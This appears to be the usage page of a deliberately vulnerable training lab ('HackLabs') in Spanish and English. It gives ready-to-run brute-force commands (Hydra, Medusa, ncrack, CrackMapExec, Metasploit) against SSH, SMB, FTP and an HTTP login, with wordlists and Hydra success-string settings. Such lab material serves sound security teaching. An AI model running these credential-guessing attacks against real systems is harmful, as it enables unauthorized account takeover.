SSH Bruteforce

Servicio SSH real corriendo en el puerto 22 del host objetivo. No hay rate-limiting activo.

# Nmap — detección de servicio
nmap -sV -p 22 TARGET_IP
# Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
hydra -L users.txt -P rockyou.txt -t 4 ssh://TARGET_IP
# Medusa
medusa -h TARGET_IP -u root -P rockyou.txt -M ssh
# ncrack
ncrack -p 22 --user root -P rockyou.txt TARGET_IP
# Metasploit
use auxiliary/scanner/ssh/ssh_login
set RHOSTS TARGET_IP; set PASS_FILE rockyou.txt; run
SMB Bruteforce

Servicio SMB real corriendo en el puerto 445 del host objetivo. Detectable con nmap y bruteforceable con las herramientas habituales.

# Nmap — detección de servicio
nmap -sV -p 445 TARGET_IP
# Hydra
hydra -l Administrator -P rockyou.txt smb://TARGET_IP
# CrackMapExec
crackmapexec smb TARGET_IP -u Administrator -p rockyou.txt
crackmapexec smb TARGET_IP -u users.txt -p passwords.txt --no-bruteforce
# Metasploit
use auxiliary/scanner/smb/smb_login
set RHOSTS TARGET_IP
set SMBUser Administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
FTP Bruteforce

Servicio FTP real corriendo en el puerto 21 del host objetivo. Sin rate-limiting ni bloqueo de cuenta. El usuario y la contraseña son desconocidos — descúbrelos por fuerza bruta.

# Servicio FTP activo en:
ftp://TARGET_IP:21
# Nmap — detección de servicio
nmap -sV -p 21,22,445 TARGET_IP
El usuario no está revelado. Usa una wordlist de usuarios para descubrirlo junto con la contraseña.

Guía de uso

  1. El endpoint /bruteforce/login no implementa rate-limiting ni bloqueo de cuenta.
  2. Hydra HTTP: Usa S=Login correcto como indicador de éxito (el texto de error aparece en el HTML estático de la página).
  3. Burp Intruder: Usa Cluster Bomb para atacar usuario + contraseña simultáneamente.
  4. Wordlists recomendadas: /usr/share/wordlists/rockyou.txt, /usr/share/seclists/Passwords/, /usr/share/seclists/Usernames/
  5. Para SSH/SMB, reemplaza TARGET_IP por la IP de la máquina objetivo.

Herramientas

hydra medusa ncrack crackmapexec Burp Intruder Metasploit

HTTP Login — Hydra

# Con deploy.sh / Docker (puerto 80):
hydra -l admin -P /usr/share/wordlists/fasttrack.txt \
  TARGET_IP http-post-form \
  "/bruteforce/login:username=^USER^&password=^PASS^:S=Login correcto" -t 64

# En local sin Docker (puerto 5000):
hydra -l admin -P /usr/share/wordlists/fasttrack.txt \
  TARGET_IP -s 5000 http-post-form \
  "/bruteforce/login:username=^USER^&password=^PASS^:S=Login correcto" -t 64

Usage Guide

  1. HackLabs' /bruteforce/login endpoint has no rate-limiting or account lockout.
  2. Hydra HTTP: Use S=Login correcto as the success indicator (the failure text appears in the page's static HTML).
  3. Burp Intruder: Use Cluster Bomb to attack username + password simultaneously.
  4. Recommended wordlists: /usr/share/wordlists/rockyou.txt, /usr/share/seclists/Passwords/, /usr/share/seclists/Usernames/
  5. For SSH/SMB, replace TARGET_IP with the target machine IP.
